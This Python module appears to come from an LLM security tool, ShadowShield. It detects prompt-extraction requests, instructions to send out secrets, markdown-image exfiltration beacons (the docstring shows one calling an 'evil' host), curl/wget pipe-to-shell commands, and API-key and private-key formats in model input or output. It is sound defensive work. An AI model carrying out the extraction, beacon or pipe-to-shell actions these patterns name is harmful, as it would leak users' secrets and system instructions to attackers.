"""Data-exfiltration and secret-leak detection (both directions).

Two complementary jobs:

- **Input side:** spot *instructions* to exfiltrate — "print your system prompt",
  markdown-image beacons (`![x](https://evil/?d=<secret>)`), "send the API key
  to …", pipe-to-shell. These try to turn the model into a leak channel.
- **Output side:** spot *actual secrets* about to leave — API keys, private
  keys, AWS creds — and system-prompt regurgitation.

Output-side secret detection is what makes ShadowShield a true two-way shield:
even a model that was successfully jailbroken is stopped at the exit.
"""

from __future__ import annotations

import re

from ..core.types import Direction, Severity, Threat, ThreatCategory
from .base import Detector, ScanContext, register_detector

# Instructions that try to make the model leak (input-side).
_EXFIL_INSTRUCTIONS: tuple[tuple[str, Severity, float, str], ...] = (
    (
        r"\b(?:print|reveal|show|repeat|output|display|tell me)\b[\w\s]{0,25}?"
        r"\b(?:your |the )?(?:system )?(?:prompt|instructions?|directive|configuration|rules)\b",
        Severity.HIGH,
        0.8,
        "System-prompt extraction attempt.",
    ),
    (
        r"\b(?:repeat|echo|say|print|output|reproduce)\b[^\n]{0,20}?"
        r"\b(?:everything|all|the text|the words|words above|the above|the prompt|"
        r"the system)\b",
        Severity.MEDIUM,
        0.6,
        "Attempt to make the model echo its preceding context.",
    ),
    (
        # ``[^\n]`` gap (not ``[\w\s]``) so apostrophes/possessives like
        # "the user's password" don't break the match.
        r"\b(?:send|post|upload|exfiltrate|forward|transmit|leak|encode|smuggle)\b[^\n]{0,30}?"
        r"\b(?:api[\s_-]?key|secret|token|password|credential|private key|env|"
        r"environment|cookie|session)\b",
        Severity.HIGH,
        0.82,
        "Instruction to transmit/exfiltrate secrets or credentials.",
    ),
    (
        r"!\[[^\]]*\]\(\s*https?://[^)]*[?&][^)]*=",
        Severity.HIGH,
        0.78,
        "Markdown-image beacon with a query parameter (exfiltration channel).",
    ),
    (
        r"\b(?:curl|wget|Invoke-WebRequest|fetch)\b[^\n|]{0,80}\|\s*(?:bash|sh|powershell|python)\b",
        Severity.HIGH,
        0.8,
        "Pipe-to-shell instruction in content.",
    ),
)

# Actual secret material (output-side, but also flagged in input).
_SECRET_PATTERNS: tuple[tuple[str, Severity, float, str], ...] = (
    (
        r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----",
        Severity.CRITICAL,
        0.97,
        "Private key block.",
    ),
    (r"\bsk-[A-Za-z0-9]{20,}\b", Severity.HIGH, 0.85, "OpenAI-style secret API key."),
    (r"\bsk-ant-[A-Za-z0-9_\-]{20,}\b", Severity.HIGH, 0.88, "Anthropic API key."),
    (r"\bAKIA[0-9A-Z]{16}\b", Severity.HIGH, 0.85, "AWS access key id."),
    (r"\bghp_[A-Za-z0-9]{36}\b", Severity.HIGH, 0.85, "GitHub personal access token."),
    (r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b", Severity.HIGH, 0.82, "Slack token."),
    (r"\bAIza[0-9A-Za-z_\-]{35}\b", Severity.HIGH, 0.82, "Google API key."),
    (
        r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b",
        Severity.MEDIUM,
        0.6,
        "JWT token.",
    ),
)

_EXFIL_COMPILED = tuple(
    (re.compile(p, re.IGNORECASE), s, sc, m) for p, s, sc, m in _EXFIL_INSTRUCTIONS
)
_SECRET_COMPILED = tuple((re.compile(p), s, sc, m) for p, s, sc, m in _SECRET_PATTERNS)


@register_detector
class ExfiltrationDetector(Detector):
    """Detects exfiltration instructions (input) and secret leaks (both ways)."""

    name = "data_exfiltration"

    def scan(self, text: str, *, context: ScanContext) -> list[Threat]:
        threats: list[Threat] = []
        body = context.normalized.normalized

        # Instruction patterns are an input-side concern.
        if context.direction is Direction.INPUT:
            for pattern, severity, score, message in _EXFIL_COMPILED:
                m = pattern.search(body)
                if m:
                    threats.append(
                        Threat(
                            category=ThreatCategory.DATA_EXFILTRATION,
                            severity=severity,
                            score=score,
                            detector=self.name,
                            message=message,
                            matched=m.group(0)[:160],
                        )
                    )

        # Secret material matters in BOTH directions: in input it may be a
        # planted lure; in output it's an active leak being stopped at the exit.
        for pattern, severity, score, message in _SECRET_COMPILED:
            # Match against the raw text — secrets must not be normalised away.
            m = pattern.search(text)
            if m:
                leak_severity = severity
                if context.direction is Direction.OUTPUT:
                    leak_severity = Severity(min(Severity.CRITICAL, severity + 1))
                threats.append(
                    Threat(
                        category=ThreatCategory.SECRET_LEAK,
                        severity=leak_severity,
                        score=score,
                        detector=self.name,
                        message=(
                            f"{message} ({'leaving in model output' if context.direction is Direction.OUTPUT else 'present in input'})"
                        ),
                        # Never echo the secret itself into a Threat/audit record.
                        matched=None,
                        span=m.span(),
                        metadata={"secret_kind": message},
                    )
                )

        return threats
